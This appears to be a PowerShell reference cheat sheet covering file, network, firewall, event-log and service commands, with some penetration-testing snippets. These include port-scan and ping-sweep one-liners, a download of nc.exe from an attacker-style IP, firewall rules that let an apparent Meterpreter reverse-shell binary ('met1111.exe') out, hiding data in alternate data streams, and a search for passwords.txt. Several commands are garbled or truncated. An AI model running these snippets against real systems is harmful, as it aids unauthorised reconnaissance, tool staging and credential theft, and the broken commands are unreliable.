# Powershell

## Powershell Overview

Powershell:

Restricted \(Default\): Interactive shell use is permitted, all scripts denied. AllSigned: Interactive shell use is permitted; all scripts and configuration files must be digitally signed with a trusted code signing certificate RemoteSigned: Interactive shell use is permitted, all scripts and configuration files downloaded from the Internet must be digitally signed with a trusted code signing certificate; scripts and configuration files created locally do not need to be signed; no interactive prompt required to run signed scripts. Unrestricted: Interactive shell use is permitted; all scripts can be run and no script signatures required. Bypass: Interactive shell use is permitted; all scripts can be run and no script signatures are required.

## Powershell Basics

Get a directory listing \(ls, dir, gci\):

```text
Get-ChildItem
```

Copy a file \(cp, copy, cpi\):

```text
Copy-Item src.txt dst.txt
```

Find more about a command:

```text
man get-history
```

Use an alias - learn from get-history:

```text
ghy [Get History]
gsv [Get Services]
```

Move a file \(mv, move, mi\):

```text
Move-Item src.txt dst.txt
```

Get SHA1 hash of a file:

```text
Get-FileHash -Algorithm SHA1 file.txt
```

Obtain MD5 and SHA1 checksums for all files recursively from current directory:

```text
gci -Recurse | select FullName | %{get-Filehash -Algorithm md5 -Path $.FullName ; get-FileHash -Algorithm sha1 -Path $.FullName} | format-list
```

A detailed list of examples and uses of Get-ChildItem can be found by using the following command:

```text
help Get-ChildItem –detailed
```

Search for a specific file by name in the specified directory:

```text
Get-ChildItem C:\Shared\file.txt
```

Find all files matching a wildcard search in the specified directory:

```text
Get-ChildItem C:\Shared* -Include *.txt
```

Recursively check for hidden files in all subdirectories of the specified directory. The -Force option tells GCI to display files even if they have the hidden attribute set. The -Recurse option tells GCI to recurse into subdirectories:

```text
Get-ChildItem C:\Shared* -Force -Recurse
```

Pass the output of GCI to the Get-Acl cmdlet showing ACLs for every file found in the specified directory and all subdirectories:

```text
Get-ChildItem C:\Shared -Recurse | Get-Acl
```

Use the Where-Object cmdlet to filter all the files in the specified directory and subdirectories. Filter for files with a file size greater than 100 megabytes:

```text
Get-ChildItem C:\Shared -Recurse | Where-Object {$_.length -gt 100MB}
```

## Powershell Networking

List network adapters:

```text
Get-NetAdapter
Get-NetAdapter -Physical
```

List very detailed information about all physical and virtual network adapters:

```text
Get-NetAdapter -Includehidden | Format-List *
```

List IPv4 and IPv6 addresses for all interfaces \(replaces ipconfig.exe\):

```text
Get-NetIPAddress
```

List TCP connections and TCP listening ports \(replaces netstat.exe\):

```text
Get-NetTcpConnection | Sort State
```

List UDP listening ports \(replaces netstat.exe\):

```text
Get-NetUdpEndpoint
```

View the local route table \(replaces route.exe\):

```text
Get-Netroute
```

Resolve a DNS host name \(replaces nslookup.exe\): \#This is not usually necessary.

```text
Import-Module -Name DnsClient
Resolve-DnsName -Name $env:computername -server 127.0.0.1
```

View the ARP cache \(replaces arp.exe\):

```text
Get-NetNeighbor
```

Ping a destination IP address or host name \(replaces ping.exe\):

```text
Test-NetConnection -ComputerName $env:computername
```

## Powershell Scripts

Trace the IP route to a destination through a path of routers \(replaces tracert.exe\):

```text
Test-NetConnection -ComputerName $env:computername -Traceroute
```

Test access to a TCP port and show the governing IPSec rule \(like a port scanner\):

```text
Test-NetConnection -Computer $env:computername -Port 80 -Info detailed
```

Conduct Port Scan:

```text
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$ )) "Port $ is open!"} 2>$null
```

Ping Sweep:

```text
1..255 | % {echo "10.0.50.$"; ping -n 1 -w 100 10.0.50.$ | Select-String ttl }
```

Powershell Port Scanner:

```text
foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 10.0.50.$ip}
```

Configure an IP interface to use DHCP and refresh \(but don't do it now, example only\):

```text
Set-NetIpInterface -InterfaceIndex 3 -Dhcp enabled
Set-DnsClientServerAddress -InterfaceIndex 3 -resetserveraddresses
Restart-Service -Name dhcp -force
```

Permanently add an IP address to an interface \(but don't do it now, example only\):

```text
new-netipaddress -InterfaceIndex 3 -IpAddress 10.18.3.1 -prefixlength 16 -defaultgateway 10.18.1.1
```

Remove an IP address from any interface which currently possesses it:

```text
remove-netipaddress -IpAddress 10.18.3.1
```

Assign primary and secondary DNS servers to an interface with index number 38 \(but don't do it now, example only\):

```text
set-dnsclientserveraddress -InterfaceIndex 38 -serveraddresses @("10.18.1.5","10.18.1.6")
```

Empty the net neighbor cache \("ARP cache"\) without being prompted to confirm:

```text
Remove-NetNeighbor -Confirm:$false
```

Display the connection profile \(Public, Private, Domain\) for each interface:

```text
Get-NetConnectionProfile | Format-Table InterfaceAlias,NetworkCategory
```

## Powershell Firewall Interaction

Display the state of the firewall for each interface profile type:

```text
Get-NetFirewallProfile
```

Start a process from CLI with powershell:

```text
start-process wireshark
```

Sortable firewall rule list

```text
Get-NetFirewallRule -all | Out-GridView
```

Enable Remote Desktop firewall access

```text
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Allow outbound by application name

```text
New-NetFirewallRule -DisplayName metrev -Program C:\scripts\met1111.exe -Direction
```

Outbound Delete a rule

```text
Get-NetFirewallRule -DisplayName metrev |
Remove-NetFirewallRule
```

Change a rule \(metrev.exe in any folder\)

```text
Set-NetFirewallRule -DisplayName metrev|
Set-NetFirewallRule -Program met1111.exe
```

Allowing list of IP addresses:

```text
$pentesters=('108.0.16.144','69.163.153.109')
New-NetFirewallRule -Action Allow `
```

List and Modify Firewall Rules:

```text
Get-NetFirewallRule –all
New-NetFirewallRule -Action Allow - DisplayName LetMeIn -RemoteAddress 10.10.10.25
```

## Powershell Hotfix

The Get-HotFix cmdlet can get used to view hotfix information such as listing all installed hotfixes:

```text
Get-HotFix
```

To get more detailed information about each of the installed hotfixes, we can pass the array of hotfix objects to the Format-List cmdlet, which will show us a predetermined list of properties for each hotfix:

```text
Get-HotFix | Format-List
```

We can also sort our output using the Sort-Object cmdlet by providing it with the property we want to sort on. In this example, we will sort all installed hotfxes by their InstalledOn date:

```text
Get-HotFix | Sort-Object -Property InstalledOn
```

Finally, we can view detailed information about a specific hotfix with array notation and the Format-List cmdlet. We first put our Get-Hotfix results in parentheses to indicate that we wish to treat the output of this command as an array. We can then use our square bracket notation \[3\] to refer to the fourth hotfix in the list. This hotfix is then passed to Format-List with a wildcard property to indicate we want to see all properties, not just the default set, for that hotfix.

```text
(Get-HotFix)[3] | Format-List -Property *
```

## Powershell Event Logs and Execution Policy

See Execution Policy:

```text
get-executionpolicy
```

To change policy to remote signed:

```text
set-executionpolicy remotesigned -force
```

View Windows Event Logs:

```text
Get-WinEvent -LogName Security
```

To list all files in the current directory and their streams we can use either dir /r or Get-Item with the -Stream parameter in PS 3.0:

```text
cmd.exe /c "dir /r" PS 3.0> Get-Item -Stream
```

Reading an alternate data stream can be done by using a colon between the filename and the stream name. In PS 3.0 we can specify which stream we wish to access:

```text
cmd.exe /c "type file.txt:stream.txt"
```

Reading an alternate data stream can be done by using a colon between the filename and the stream name. In PS 3.0 we can specify which stream we wish to access:

```text
Get-Content file.txt -Stream stream.txt
```

Writing to an ADS is very similar to reading from one:

```text
cmd.exe /c "echo secret > file.txt:stream.txt" PS 3.0> Set-Content file.txt -Stream stream.txt "secret"
```

Let’s take a look at the entire Security event log looking at each available option:

```text
Get-WinEvent -ListLog Security | Format-List -property *
```

To see a list of all local event logs:

```text
get-winevent -listlog *
```

To see a list of logs that begin with "s" on the remote computer named "server47":

```text
get-winevent -listlog s* -computername "server47"
```

To see the details of just the Security log:

```text
get-winevent -listlog security | format-list *
```

To show the last 20 events from the System log:

```text
$logdata = get-winevent -logname system -maxevents 20
```

To get the last 20 events from each of the three classic logs:

```text
$events = get-winevent -logname system -maxevents 20
$events += get-winevent -logname application -maxevents 20
$events += get-winevent -logname security -maxevents 20
$events | sort-object -property TimeCreated | format-table TimeCreated,ID,Level,Message -auto
```

To only show events with ID number 4624 from the Security log:

```text
get-winevent -filterhashtable @{LogName="Security"; ID=4624}
```

## Powershell File Searching

Recursively check for hidden files in all subdirectories of the specified directory. The -Force option tells GCI to display files even if they have the hidden attribute set. The -Recurse option tells GCI to recurse into subdirectories:

```text
Get-ChildItem C:\Shared* -Force -Recurse
```

Pass the output of GCI to the Get-Acl cmdlet showing ACLs for every file found in the specified directory and all subdirectories:

```text
Get-ChildItem C:\Shared -Recurse | Get-Acl
```

Enter a remote PowerShell session on the Windows server. The credentials we stored will be automatically used.

```text
Enter-PSSession -ComputerName 10.1.1.98
```

Wget in Powershell:

```text
(New-Object System.Net.WebClient).DownloadFile("http://10. 10.10.10/nc.exe","nc.exe")
```

Find all files with a particular name:

```text
Get-ChildItem "C:\Users\" -recurse -include passwords.txt
```

List programs which start automatically in registry:

```text
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersio n\run
```

## Powershell Service, Porcess Interaction and more

Start Maximized Notepad:

```text
Start-Process notepad -WindowStyle Maximized
```

Powershell running processes:

```text
Get-Service | Where-Object { $_.Status -eq "Running" } | Sort-Object -Property Name
```

Powershell stoppedprocesses:

```text
Get-Service | Where-Object { $_.Status -eq "Stopped" } | Sort-Object -Property Name
```

Powershell start firefox application and then in an expanded view:

```text
Start-Process Firefox
Start-Process Firefox -WindowStyle Maximized
```

Powershell - stop process by number or name:

```text
Stop-process 908
Stop-process -Name Firefox
```

Powershell - provide list of various options we have with -service:

```text
Get-command -Noun Service
```

Powershell - find all cmdlets provided by the module

```text
Get-Command -Module VMware
```

List running services:

```text
Get-Service | Where-Object {$_.status -eq "running"}
```

Determine the TapiSrv file information and process owner:

```text
Get-Process TapiSrv –fileversioninfo
```

Identify who is running the process:

```text
(get-wmiobject win32process | where{$.ProcessName -eq 'TapiSrv.exe'}).getowner() | Select -property domain, user
```

Will tell us the date and time it was created:

```text
write-host ([WMI]'').ConvertToDateTime((Get-WmiObject win32process | where{$.ProcessName -eq 'TapiSrv.exe'}).creationdate)
```

To find a specific IP address in a log file:

```text
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
```

To find a specific IP address in a log file - selecting the entire line:

```text
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt |Select line
```

To find a specific IP address in a log file - selecting the entire line and list how many entries there are:

```text
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt |Select line|Measure-Object
```

Enable all the firewall rules for the "File and Printer Sharing" group \(in en-US culture\):

```text
Enable-NetFireWallrule -Displaygroup "File and Printer Sharing"
```

Create an inbound firewall rule to block access to TCP port 3666:

```text
new-NetFireWallrule -displayname "Drop APT Back Door" -direction inbound –localport 3666 -protocol tcp -action block
Note: This new rule can now be seen in the graphical Windows Firewall snap-in.
```

Delete a firewall rule by its display name:

```text
remove-NetFireWallrule -displayname "Drop APT Back Door"
```

List the AppLocker cmdlets from the module:

```text
get-command -module applocker
```

Display file information which AppLocker can use to create rules:

```text
dir c:\windows\system32*.exe | get-applockerfileinformation | format-list *
```

Powershell Scripts and Automation DNS Names from Certificates - The script is available at [https://github.com/nidem/pentools/blob/master/CertInfo.ps1](https://github.com/nidem/pentools/blob/master/CertInfo.ps1).:

```text
Import-Module .\CertInfo.ps1
Get-SSLNames cert.org
```

PowerMeta searches for publicly available files hosted on various website -script available at [https://github.com/dafthack/PowerMeta](https://github.com/dafthack/PowerMeta):

```text
Import-Module .\Powermeta.ps1
Invoke
PowerMeta -TargetDomain sans.org -Download -Extract
```

Import new Module:

```text
import-module -name D:\tools\powershell\Get-NetworkStatistics.psm1 –verbose
```

Import the AppLocker module:

```text
import-module applocker
```

